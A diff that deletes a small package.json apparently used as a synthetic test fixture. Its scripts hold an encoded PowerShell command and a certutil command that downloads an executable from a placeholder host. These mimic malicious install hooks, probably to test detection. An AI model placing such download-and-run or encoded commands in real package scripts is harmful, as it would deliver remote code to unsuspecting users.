@@ -1,8 +1,0 @@
-{
-  "//": "SYNTHETIC TEST FIXTURE — not functional",
-  "name": "fixture",
-  "scripts": {
-    "setup:win": "powershell -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAbwAgAGYAcgBvAG0AIAB0AGgAZQAgAHMAeQBuAHQAaABlAHQAaQBjACAAZgBpAHgAdAB1AHIAZQA7ACAAbgBvAHQAIAByAHUAbgAnAA==",
-    "fetch:win": "certutil -urlcache -f https://payload.example.invalid/t.exe t.exe"
-  }
-}
